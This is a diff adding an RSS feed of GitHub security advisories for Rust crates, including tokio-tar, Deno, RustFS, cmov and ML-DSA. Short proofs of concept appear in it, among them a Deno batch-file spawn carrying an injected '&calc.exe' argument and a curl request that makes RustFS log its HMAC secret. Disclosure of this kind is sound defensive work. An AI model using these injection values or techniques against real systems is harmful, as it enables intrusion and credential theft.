@@ -1,0 +1,1538 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://xlordz.github.io/github-advisory-database-rss/rust.rss</id>
+    <title>Security Advisory for Rust crates</title>
+    <updated>2026-01-22T14:42:15.528Z</updated>
+    <generator>github-advisory-database-rss</generator>
+    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
+    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
+    <rights>github-advisory-database-rss</rights>
+    <category term="CRITICAL"/>
+    <category term="HIGH"/>
+    <category term="MODERATE"/>
+    <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[triton-vm] Triton VM has a Soundness Vulnerability due to Improper Sampling of Randomness]]></title>
+        <id>https://github.com/advisories/GHSA-rjr4-v43m-pxq6</id>
+        <link href="https://github.com/advisories/GHSA-rjr4-v43m-pxq6"/>
+        <updated>2026-01-22T13:41:48.000Z</updated>
+        <content type="html"><![CDATA[<p>In affected versions of Triton VM, the verifier failed to correctly sample randomness in the FRI sub-protocol.</p>
+<p>Malicious provers can exploit this to craft proofs for arbitrary statements that this verifier accepts as valid, undermining soundness.</p>
+<p>Protocols that rely on proofs and the supplied verifier of the affected versions of Triton VM are completely broken. Protocols implementing their own verifier might be unaffected.</p>
+<p>The flaw was corrected in commit 3a045d63, where the relevant randomness is sampled correctly.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/TritonVM/triton-vm/commit/3a045d636e97bb2eb628671db0001aa665c19dd8">https://github.com/TritonVM/triton-vm/commit/3a045d636e97bb2eb628671db0001aa665c19dd8</a></li>
+<li><a href="https://github.com/TritonVM/triton-vm/releases/tag/v2.0.0">https://github.com/TritonVM/triton-vm/releases/tag/v2.0.0</a></li>
+<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0004.html">https://rustsec.org/advisories/RUSTSEC-2026-0004.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-rjr4-v43m-pxq6">https://github.com/advisories/GHSA-rjr4-v43m-pxq6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rjr4-v43m-pxq6</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-01-21T22:52:56.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[tokio-tar] astral-tokio-tar Vulnerable to PAX Header Desynchronization]]></title>
+        <id>https://github.com/advisories/GHSA-j5gw-2vrg-8fgx</id>
+        <link href="https://github.com/advisories/GHSA-j5gw-2vrg-8fgx"/>
+        <updated>2026-01-16T22:12:13.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Versions of <code>astral-tokio-tar</code> prior to 0.5.6 contain a boundary parsing vulnerability that allows attackers to smuggle additional archive entries by exploiting inconsistent PAX/ustar header handling. When processing archives with PAX-extended headers containing size overrides, the parser incorrectly advances stream position based on ustar header size (often zero) instead of the PAX-specified size, causing it to interpret file content as legitimate tar headers.</p>
+<p>This vulnerability was disclosed to multiple Rust tar parsers, all derived from the original <code>async-tar</code> fork of <code>tar-rs</code>.</p>
+<h2 id="details">Details</h2>
+<h3 id="vulnerability-description">Vulnerability Description</h3>
+<p>The vulnerability stems from inconsistent handling of PAX extended headers versus ustar headers when determining file data boundaries. Specifically:</p>
+<ol>
+<li><strong>PAX header</strong> correctly specifies the file size (e.g., <code>size=1048576</code>)</li>
+<li><strong>ustar header</strong> incorrectly specifies zero size (<code>size=000000000000</code>)</li>
+<li><strong>tokio-tar</strong> advances the stream position based on the ustar size (0 bytes)</li>
+<li><strong>Inner content</strong> is then interpreted as legitimate outer archive entries</li>
+</ol>
+<h3 id="attack-mechanism">Attack Mechanism</h3>
+<p>When a TAR file contains:</p>
+<ul>
+<li>An outer entry with PAX <code>size=N</code> but ustar <code>size=0</code></li>
+<li>File data that begins with valid TAR header structures</li>
+<li>The parser treats inner content as additional outer entries</li>
+</ul>
+<p>This creates a <strong>header/data desynchronization</strong> where the parser's position becomes misaligned with actual file boundaries.</p>
+<h3 id="root-cause">Root Cause</h3>
+<pre><code class="language-rust">// Vulnerable: Uses ustar size instead of PAX override
+let file_size = header.size(); // Returns 0 from ustar field
+let next_pos = current_pos + 512 + pad_to_512(file_size); // Advances 0 bytes
+
+// Fixed: Apply PAX overrides before position calculation
+let mut file_size = header.size();
+if let Some(pax_size) = pending_pax.get("size") {
+    file_size = pax_size.parse().unwrap();
+}
+let next_pos = current_pos + 512 + pad_to_512(file_size); // Correct advance
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>The impact of this vulnerability depends on where <code>astral-tokio-tar</code> is used, and whether it is used to extract untrusted tar archives. If used to extract untrusted inputs, it may result in unexpected attacker-controlled access to the filesystem, in turn potential resulting in arbitrary code execution or credential exfiltration.</p>
+<p>See <a href="https://github.com/astral-sh/uv/security/advisories/GHSA-w476-p2h3-79g9"><strong>GHSA-w476-p2h3-79g9</strong></a> for how this vulnerability affects <code>uv</code>, <code>astral-tokio-tar</code>'s primary downstream user. Observe that <strong>unlike</strong> this advisory,<code> uv</code>'s advisory is considered <strong>low severity</strong> due to overlap with intentional existing capabilities in source distributions. </p>
+<h2 id="workarounds">Workarounds</h2>
+<p>Users are advised to upgrade to version 0.5.6 or newer to address this advisory.</p>
+<p>There is no workaround other than upgrading.</p>
+<h2 id="timeline">Timeline</h2>
+<table>
+<thead>
+<tr>
+<th>Date</th>
+<th>Event</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Aug 21, 2025</td>
+<td>Vulnerability discovered by Edera Security Team</td>
+</tr>
+<tr>
+<td>Aug 21, 2025</td>
+<td>Initial analysis and PoC confirmed</td>
+</tr>
+<tr>
+<td>Aug 22, 2025</td>
+<td>Maintainers notified (privately)</td>
+</tr>
+<tr>
+<td>Aug 25, 2025</td>
+<td>Private patch and test suite shared</td>
+</tr>
+<tr>
+<td>Oct 7, 2025</td>
+<td>Text freeze for GHSA</td>
+</tr>
+<tr>
+<td>Oct 21, 2025</td>
+<td>Coordinated public disclosure and patched releases</td>
+</tr>
+</tbody></table>
+<h2 id="credits">Credits</h2>
+<ul>
+<li><strong>Discovered by:</strong> Steven Noonan (Edera) and Alex Zenla (Edera)</li>
+<li><strong>Coordinated disclosure:</strong> Ann Wallace (Edera)</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/astral-sh/tokio-tar/security/advisories/GHSA-j5gw-2vrg-8fgx">https://github.com/astral-sh/tokio-tar/security/advisories/GHSA-j5gw-2vrg-8fgx</a></li>
+<li><a href="https://github.com/astral-sh/uv/security/advisories/GHSA-w476-p2h3-79g9">https://github.com/astral-sh/uv/security/advisories/GHSA-w476-p2h3-79g9</a></li>
+<li><a href="https://github.com/astral-sh/tokio-tar/commit/22b3f884adb7a2adf1d3a8d03469533f5cbc8318">https://github.com/astral-sh/tokio-tar/commit/22b3f884adb7a2adf1d3a8d03469533f5cbc8318</a></li>
+<li><a href="https://edera.dev/stories/tarmageddon">https://edera.dev/stories/tarmageddon</a></li>
+<li><a href="https://github.com/edera-dev/cve-tarmageddon">https://github.com/edera-dev/cve-tarmageddon</a></li>
+<li><a href="https://rustsec.org/advisories/RUSTSEC-2025-0110.html">https://rustsec.org/advisories/RUSTSEC-2025-0110.html</a></li>
+<li><a href="https://rustsec.org/advisories/RUSTSEC-2025-0111.html">https://rustsec.org/advisories/RUSTSEC-2025-0111.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-j5gw-2vrg-8fgx">https://github.com/advisories/GHSA-j5gw-2vrg-8fgx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-j5gw-2vrg-8fgx</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-10-21T15:42:51.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[deno] Deno has an incomplete fix for command-injection prevention on Windows — case-insensitive extension bypass]]></title>
+        <id>https://github.com/advisories/GHSA-m3c4-prhw-mrx6</id>
+        <link href="https://github.com/advisories/GHSA-m3c4-prhw-mrx6"/>
+        <updated>2026-01-16T15:49:39.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A prior patch aimed to block spawning Windows batch/shell files by returning an error when a spawned path’s extension matched <code>.bat</code> or <code>.cmd</code>. That check performs a case-sensitive comparison against lowercase literals and therefore can be bypassed when the extension uses alternate casing (for example <code>.BAT, .Bat</code>, etc.).</p>
+<h3 id="poc">POC</h3>
+<pre><code class="language-javascript">const command = new Deno.Command('./test.BAT', {
+  args: ['&amp;calc.exe'],
+});
+const child = command.spawn();
+</code></pre>
+<p>This causes <code>calc.exe</code> to be launched; see the attached screenshot for evidence.</p>
+<p><strong>Patched in <code>CVE-2025-61787</code> — prevents execution of <code>.bat</code> and <code>.cmd</code> files:</strong>
+<img alt="photo_2025-10-10 02 27 23" src="https://github.com/user-attachments/assets/43df25e2-e2e1-48aa-8060-cb0a22637f1f"></p>
+<p><strong>Bypass of the patched vulnerability:</strong>
+<img alt="photo_2025-10-10 02 27 25" src="https://github.com/user-attachments/assets/2be1afb4-84a1-4883-8e18-6a174fdd3615"></p>
+<h3 id="impact">Impact</h3>
+<p>The script launches calc.exe on Windows, demonstrating that passing user-controlled arguments to a spawned batch script can result in command-line injection.</p>
+<h3 id="mitigation">Mitigation</h3>
+<p>Users should update to Deno v2.5.6 or newer.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-m3c4-prhw-mrx6">https://github.com/denoland/deno/security/advisories/GHSA-m3c4-prhw-mrx6</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-22864">https://nvd.nist.gov/vuln/detail/CVE-2026-22864</a></li>
+<li><a href="https://github.com/denoland/deno/releases/tag/v2.5.6">https://github.com/denoland/deno/releases/tag/v2.5.6</a></li>
+<li><a href="https://github.com/advisories/GHSA-m3c4-prhw-mrx6">https://github.com/advisories/GHSA-m3c4-prhw-mrx6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m3c4-prhw-mrx6</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-01-16T15:49:38.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[deno] Deno node:crypto doesn't finalize cipher]]></title>
+        <id>https://github.com/advisories/GHSA-5379-f5hf-w38v</id>
+        <link href="https://github.com/advisories/GHSA-5379-f5hf-w38v"/>
+        <updated>2026-01-16T15:49:36.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The vulnerability allows an attacker to have infinite encryptions. </p>
+<p>This can lead to naive attempts at brute forcing, as well as more refined attacks with the goal to learn the server secrets.</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-js">import crypto from "node:crypto";
+
+const key = crypto.randomBytes(32);
+const iv = crypto.randomBytes(16);
+const cipher = crypto.createCipheriv("aes-256-cbc", key, iv);
+cipher.final()
+
+console.log(cipher);
+</code></pre>
+<h3 id="expected-output">Expected Output</h3>
+<pre><code class="language-js">Cipheriv {
+  _decoder: null,
+  _options: undefined,
+  Symbol(kHandle): CipherBase {}
+}
+</code></pre>
+<h3 id="actual-output">Actual Output</h3>
+<pre><code class="language-js">Cipheriv {
+  _events: {
+    close: undefined,
+    error: undefined,
+    prefinish: [Function: prefinish],
+    finish: undefined,
+    drain: undefined,
+    data: undefined,
+    end: undefined,
+    readable: undefined
+  },
+  _readableState: ReadableState {
+    highWaterMark: 65536,
+    buffer: [],
+    bufferIndex: 0,
+    length: 0,
+    pipes: [],
+    awaitDrainWriters: null,
+    [Symbol(kState)]: 1048844
+  },
+  _writableState: WritableState {
+    highWaterMark: 65536,
+    length: 0,
+    corked: 0,
+    onwrite: [Function: bound onwrite],
+    writelen: 0,
+    bufferedIndex: 0,
+    pendingcb: 0,
+    [Symbol(kState)]: 17580812,
+    [Symbol(kBufferedValue)]: null
+  },
+  allowHalfOpen: true,
+  _final: [Function: final],
+  _maxListeners: undefined,
+  _transform: [Function: transform],
+  _eventsCount: 1,
+  [Symbol(kCapture)]: false,
+  [Symbol(kCallback)]: null
+}
+</code></pre>
+<h3 id="mitigations">Mitigations</h3>
+<p>All users should upgrade to Deno v2.6.0 or newer.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-5379-f5hf-w38v">https://github.com/denoland/deno/security/advisories/GHSA-5379-f5hf-w38v</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-22863">https://nvd.nist.gov/vuln/detail/CVE-2026-22863</a></li>
+<li><a href="https://github.com/denoland/deno/releases/tag/v2.6.0">https://github.com/denoland/deno/releases/tag/v2.6.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-5379-f5hf-w38v">https://github.com/advisories/GHSA-5379-f5hf-w38v</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5379-f5hf-w38v</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-01-16T15:49:35.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[rustfs] RustFS's RPC signature verification logs shared secret]]></title>
+        <id>https://github.com/advisories/GHSA-333v-68xh-8mmq</id>
+        <link href="https://github.com/advisories/GHSA-333v-68xh-8mmq"/>
+        <updated>2026-01-16T19:11:02.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Invalid RPC signatures cause the server to log the shared HMAC secret (and expected signature), which exposes the secret to log readers and enables forged RPC calls.</p>
+<h3 id="details">Details</h3>
+<p>In <a href="https://github.com/rustfs/rustfs/blob/9e162b6e9ebb874cc1d06a7b33bc4a05786578aa/crates/ecstore/src/rpc/http_auth.rs#L115-L122"><code>crates/ecstore/src/rpc/http_auth.rs:115-122</code></a> , the invalid signature branch logs sensitive data:</p>
+<pre><code class="language-rs">if signature != expected_signature {
+    error!(
+        "verify_rpc_signature: Invalid signature: secret {}, url {}, method {}, timestamp {}, signature {}, expected_signature {}",
+        secret, url, method, timestamp, signature, expected_signature
+    );
+
+    return Err(std::io::Error::other("Invalid signature"));
+}
+</code></pre>
+<p>This log line includes <code>secret</code> and <code>expected_signature</code>, both derived from the shared HMAC key. Any invalidly signed request triggers this path. The function is reachable from RPC and admin request handlers.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Run RustFS with error logging enabled.</li>
+<li>Send a request with an invalid signature:<pre><code> ts=$(date +%s)
+ curl -v \
+   -H "x-rustfs-timestamp: $ts" \
+   -H "x-rustfs-signature: invalid-signature" \
+   "http://localhost:9000/rustfs/rpc/read_file_stream?disk=foo&amp;volume=bar&amp;path=baz&amp;offset=0&amp;length=1"
+</code></pre>
+</li>
+<li>Observed output:<pre><code> HTTP 403 AccessDenied: Invalid signature
+ verify_rpc_signature: Invalid signature: secret rustfsadmin, url /rustfs/rpc/read_file_stream?disk=foo&amp;volume=bar&amp;path=baz&amp;offset=0&amp;length=1, method GET, timestamp 1767852115, signature invalid-signature, expected_signature oisNxNRTb80GXf97s/PGdScJzu8QB9Oxs+uOwf8RiK8=
+</code></pre>
+</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Exposes the shared RPC HMAC secret to log readers.</li>
+<li>Enables attackers with log access to forge valid RPC signatures and make unauthorized RPC calls.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rustfs/rustfs/security/advisories/GHSA-333v-68xh-8mmq">https://github.com/rustfs/rustfs/security/advisories/GHSA-333v-68xh-8mmq</a></li>
+<li><a href="https://github.com/rustfs/rustfs/commit/6b2eebee1d07399ef02c0863bd515b4412a5a560">https://github.com/rustfs/rustfs/commit/6b2eebee1d07399ef02c0863bd515b4412a5a560</a></li>
+<li><a href="https://github.com/rustfs/rustfs/blob/9e162b6e9ebb874cc1d06a7b33bc4a05786578aa/crates/ecstore/src/rpc/http_auth.rs#L115-L122">https://github.com/rustfs/rustfs/blob/9e162b6e9ebb874cc1d06a7b33bc4a05786578aa/crates/ecstore/src/rpc/http_auth.rs#L115-L122</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-22782">https://nvd.nist.gov/vuln/detail/CVE-2026-22782</a></li>
+<li><a href="https://github.com/advisories/GHSA-333v-68xh-8mmq">https://github.com/advisories/GHSA-333v-68xh-8mmq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-333v-68xh-8mmq</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-01-16T15:48:58.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[cmov] RustCrypto Utilities cmov: `thumbv6m-none-eabi` compiler emits non-constant time assembly when using `cmovnz`]]></title>
+        <id>https://github.com/advisories/GHSA-2gqc-6j2q-83qp</id>
+        <link href="https://github.com/advisories/GHSA-2gqc-6j2q-83qp"/>
+        <updated>2026-01-15T22:34:30.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>thumbv6m-none-eabi</code> (Cortex M0, M0+ and M1) compiler emits non-constant time assembly when using <code>cmovnz</code> (portable version). I did not found any other target with the same behaviour but I did not go through all targets supported by Rust. </p>
+<h3 id="details">Details</h3>
+<p>It seems that, <a href="https://github.com/RustCrypto/utils/blob/9e555db060c80f4669d804f448a524a37d201b32/cmov/src/portable.rs#L78">during <code>mask</code> computation</a>, an LLVM optimisation pass is detecting that <a href="https://github.com/RustCrypto/utils/blob/9e555db060c80f4669d804f448a524a37d201b32/cmov/src/portable.rs#L13"><code>bitnz</code></a> is returning 0 or 1, that can be interpreted as a boolean. This intermediate value is not masked by a call to <code>black_box</code> and thus the subsequent <a href="https://github.com/RustCrypto/utils/blob/9e555db060c80f4669d804f448a524a37d201b32/cmov/src/portable.rs#L78C1-L78C84"><code>.wrapping_sub(1)</code></a> can be interpreted as a conditional bitwise conditional not.</p>
+<h3 id="poc">PoC</h3>
+<p>This is an attempt at having a minimal faulty code. In a library crate with an up-to-date <code>cmov</code> as only dependency, the content of <code>src/lib.rs</code> is:</p>
+<pre><code class="language-rust">#![no_std]
+use cmov::Cmov;
+
+#[inline(never)]
+pub fn test_ct_cmov(a: &amp;mut u8, b: u8, c: u8) {
+    a.cmovnz(&amp;b, c);
+}
+</code></pre>
+<p>The resulting assembly emitted (shown using <code>cargo asm --release --target thumbv6m-none-eabi</code> that uses <a href="https://crates.io/crates/cargo-show-asm"><code>cargo-show-asm</code></a>):</p>
+<details>
+<summary>Collapsed assembly</summary>
+
+<pre><code class="language-asm">.section .text.not_ct::test_ct_cmov,"ax",%progbits
+    .globl	not_ct::test_ct_cmov
+    .p2align	1
+    .type	not_ct::test_ct_cmov,%function
+    .code	16
+    .thumb_func
+not_ct::test_ct_cmov:
+    .fnstart
+    .cfi_sections .debug_frame
+    .cfi_startproc
+    .save	{r7, lr}
+    push {r7, lr}
+    .cfi_def_cfa_offset 8
+    .cfi_offset lr, -4
+    .cfi_offset r7, -8
+    .setfp	r7, sp
+    add r7, sp, #0
+    .cfi_def_cfa_register r7
+    .pad	#8
+    sub sp, #8
+    movs r3, #0
+    lsls r2, r2, #24
+    bne .LBB0_2
+    mvns r3, r3
+.LBB0_2:
+    ldrb r2, [r0]
+    str r3, [sp, #4]
+    str r3, [sp]
+    mov r3, sp
+    @APP
+    @NO_APP
+    ldr r3, [sp]
+    bics r1, r3
+    ands r2, r3
+    adds r1, r2, r1
+    strb r1, [r0]
+    add sp, #8
+    pop {r7, pc}
+</code></pre>
+</details>
+
+<p>The non-constant time assembly is:</p>
+<pre><code class="language-asm">    bne  .LBB0_2
+    mvns r3, r3
+.LBB0_2:
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>The exact impact is unclear, especially since <code>cmov</code> clearly warns users that the portable version is best-effort.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/RustCrypto/utils/security/advisories/GHSA-2gqc-6j2q-83qp">https://github.com/RustCrypto/utils/security/advisories/GHSA-2gqc-6j2q-83qp</a></li>
+<li><a href="https://github.com/RustCrypto/utils/commit/55977257e7c82a309d5e8abfdd380a774f0f9778">https://github.com/RustCrypto/utils/commit/55977257e7c82a309d5e8abfdd380a774f0f9778</a></li>
+<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0003.html">https://rustsec.org/advisories/RUSTSEC-2026-0003.html</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-23519">https://nvd.nist.gov/vuln/detail/CVE-2026-23519</a></li>
+<li><a href="https://github.com/advisories/GHSA-2gqc-6j2q-83qp">https://github.com/advisories/GHSA-2gqc-6j2q-83qp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2gqc-6j2q-83qp</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-01-15T18:17:15.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[lief] LIEF is vulnerable to segmentation fault]]></title>
+        <id>https://github.com/advisories/GHSA-mjjp-xjfg-97wg</id>
+        <link href="https://github.com/advisories/GHSA-mjjp-xjfg-97wg"/>
+        <updated>2026-01-13T18:31:57.000Z</updated>
+        <content type="html"><![CDATA[<p>A security flaw has been discovered in lief-project LIEF up to 0.17.1. Affected by this issue is the function Parser::parse_binary of the file src/ELF/Parser.tcc of the component ELF Binary Parser. The manipulation results in null pointer dereference. The attack must be initiated from a local position. The exploit has been released to the public and may be used for attacks. Upgrading to version 0.17.2 can resolve this issue. The patch is identified as 81bd5d7ea0c390563f1c4c017c9019d154802978. It is recommended to upgrade the affected component.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-15504">https://nvd.nist.gov/vuln/detail/CVE-2025-15504</a></li>
+<li><a href="https://github.com/lief-project/LIEF/issues/1277">https://github.com/lief-project/LIEF/issues/1277</a></li>
+<li><a href="https://github.com/lief-project/LIEF/issues/1277#issuecomment-3693859001">https://github.com/lief-project/LIEF/issues/1277#issuecomment-3693859001</a></li>
+<li><a href="https://github.com/lief-project/LIEF/commit/81bd5d7ea0c390563f1c4c017c9019d154802978">https://github.com/lief-project/LIEF/commit/81bd5d7ea0c390563f1c4c017c9019d154802978</a></li>
+<li><a href="https://github.com/lief-project/LIEF/releases/tag/0.17.2">https://github.com/lief-project/LIEF/releases/tag/0.17.2</a></li>
+<li><a href="https://github.com/oneafter/1210/blob/main/segv1">https://github.com/oneafter/1210/blob/main/segv1</a></li>
+<li><a href="https://vuldb.com/?ctiid.340375">https://vuldb.com/?ctiid.340375</a></li>
+<li><a href="https://vuldb.com/?id.340375">https://vuldb.com/?id.340375</a></li>
+<li><a href="https://vuldb.com/?submit.733329">https://vuldb.com/?submit.733329</a></li>
+<li><a href="https://github.com/advisories/GHSA-mjjp-xjfg-97wg">https://github.com/advisories/GHSA-mjjp-xjfg-97wg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mjjp-xjfg-97wg</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-01-10T12:30:16.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[ml-dsa] RustCrypto: Signatures has timing side-channel in ML-DSA decomposition]]></title>
+        <id>https://github.com/advisories/GHSA-hcp2-x6j4-29j7</id>
+        <link href="https://github.com/advisories/GHSA-hcp2-x6j4-29j7"/>
+        <updated>2026-01-13T15:10:06.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A timing side-channel was discovered in the Decompose algorithm which is used during ML-DSA signing to generate hints for the signature.</p>
+<h3 id="details">Details</h3>
+<p>The analysis was performed using a constant-time analyzer that examines compiled assembly code for instructions with data-dependent timing behavior. The analyzer flags:</p>
+<ul>
+<li><strong>UDIV/SDIV instructions</strong>: Hardware division instructions have early termination optimizations where execution time depends on operand values.</li>
+</ul>
+<p>The <code>decompose</code> function used a hardware division instruction to compute <code>r1.0 / TwoGamma2::U32</code>. This function is called during signing through <code>high_bits()</code> and <code>low_bits()</code>, which process values derived from secret key components:</p>
+<ul>
+<li><code>(&amp;w - &amp;cs2).low_bits()</code> where <code>cs2</code> is derived from secret key component <code>s2</code></li>
+<li><code>Hint::new()</code> calls <code>high_bits()</code> on values derived from secret key component <code>t0</code></li>
+</ul>
+<p><strong>Original Code</strong>:</p>
+<pre><code class="language-rust">fn decompose&lt;TwoGamma2: Unsigned&gt;(self) -&gt; (Elem, Elem) {
+    // ...
+    let mut r1 = r_plus - r0;
+    r1.0 /= TwoGamma2::U32;  // Variable-time division on secret-derived data
+    (r1, r0)
+}
+</code></pre>
+<h3 id="poc">PoC</h3>
+<p>I do not have an exploit written for this, currently.</p>
+<h3 id="impact">Impact</h3>
+<p>The dividend (<code>r1.0</code>) is derived from secret key material. An attacker with precise timing measurements could extract information about the signing key by observing timing variations in the division operation.</p>
+<h3 id="mitigation">Mitigation</h3>
+<p>Replacing division with constant-time Barrett reduction mitigates this risk. Since <code>TwoGamma2</code> is a compile-time constant, we precompute the multiplicative inverse:</p>
+<pre><code class="language-patch">diff --git a/ml-dsa/src/algebra.rs b/ml-dsa/src/algebra.rs
+index 559b68a..bb126ce 100644
+--- a/ml-dsa/src/algebra.rs
++++ b/ml-dsa/src/algebra.rs
+@@ -54,8 +54,50 @@ pub(crate) trait Decompose {
+     fn decompose&lt;TwoGamma2: Unsigned&gt;(self) -&gt; (Elem, Elem);
+ }
+ 
++/// Constant-time division by a compile-time constant divisor.
++///
++/// This trait provides a constant-time alternative to the hardware division
++/// instruction, which has variable timing based on operand values.
++/// Uses Barrett reduction to compute `x / M` where M is a compile-time constant.
++pub(crate) trait ConstantTimeDiv: Unsigned {
++    /// Bit shift for Barrett reduction, chosen to provide sufficient precision
++    const CT_DIV_SHIFT: usize;
++    /// Precomputed multiplier: ceil(2^SHIFT / M)
++    const CT_DIV_MULTIPLIER: u64;
++
++    /// Perform constant-time division of x by Self::U32
++    /// Requires: x &lt; Q (the field modulus, ~2^23)
++    #[inline(always)]
++    fn ct_div(x: u32) -&gt; u32 {
++        // Barrett reduction: q = (x * MULTIPLIER) &gt;&gt; SHIFT
++        // This gives us floor(x / M) for x &lt; 2^SHIFT / MULTIPLIER * M
++        let x64 = u64::from(x);
++        let quotient = (x64 * Self::CT_DIV_MULTIPLIER) &gt;&gt; Self::CT_DIV_SHIFT;
++        quotient as u32
++    }
++}
++
++impl&lt;M&gt; ConstantTimeDiv for M
++where
++    M: Unsigned,
++{
++    // Use a shift that provides enough precision for the ML-DSA field (Q ~ 2^23)
++    // We need SHIFT &gt; log2(Q) + log2(M) to ensure accuracy
++    // With Q &lt; 2^24 and M &lt; 2^20, SHIFT = 48 is sufficient
++    const CT_DIV_SHIFT: usize = 48;
++
++    // Precompute the multiplier at compile time
++    // We add (M-1) before dividing to get ceiling division, ensuring we never underestimate
++    #[allow(clippy::integer_division_remainder_used)]
++    const CT_DIV_MULTIPLIER: u64 = ((1u64 &lt;&lt; Self::CT_DIV_SHIFT) + M::U64 - 1) / M::U64;
++}
++
+ impl Decompose for Elem {
+     // Algorithm 36 Decompose
++    //
++    // This implementation uses constant-time division to avoid timing side-channels.
++    // The original algorithm used hardware division which has variable timing based
++    // on operand values, potentially leaking secret information during signing.
+     fn decompose&lt;TwoGamma2: Unsigned&gt;(self) -&gt; (Elem, Elem) {
+         let r_plus = self.clone();
+         let r0 = r_plus.mod_plus_minus::&lt;TwoGamma2&gt;();
+@@ -63,8 +105,9 @@ impl Decompose for Elem {
+         if r_plus - r0 == Elem::new(BaseField::Q - 1) {
+             (Elem::new(0), r0 - Elem::new(1))
+         } else {
+-            let mut r1 = r_plus - r0;
+-            r1.0 /= TwoGamma2::U32;
++            let diff = r_plus - r0;
++            // Use constant-time division instead of hardware division
++            let r1 = Elem::new(TwoGamma2::ct_div(diff.0));
+             (r1, r0)
+         }
+     }
+</code></pre>
+<p>See our blog post on <a href="https://blog.trailofbits.com/2025/11/14/how-we-avoided-side-channels-in-our-new-post-quantum-go-cryptography-libraries/">how we avoided side-channels in our Go implementation of ML-DSA</a> for more information.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/RustCrypto/signatures/security/advisories/GHSA-hcp2-x6j4-29j7">https://github.com/RustCrypto/signatures/security/advisories/GHSA-hcp2-x6j4-29j7</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-22705">https://nvd.nist.gov/vuln/detail/CVE-2026-22705</a></li>
+<li><a href="https://github.com/RustCrypto/signatures/pull/1144">https://github.com/RustCrypto/signatures/pull/1144</a></li>
+<li><a href="https://github.com/RustCrypto/signatures/commit/035d9eef98486ecd00a8bf418c7817eb14dd6558">https://github.com/RustCrypto/signatures/commit/035d9eef98486ecd00a8bf418c7817eb14dd6558</a></li>
+<li><a href="https://github.com/advisories/GHSA-hcp2-x6j4-29j7">https://github.com/advisories/GHSA-hcp2-x6j4-29j7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
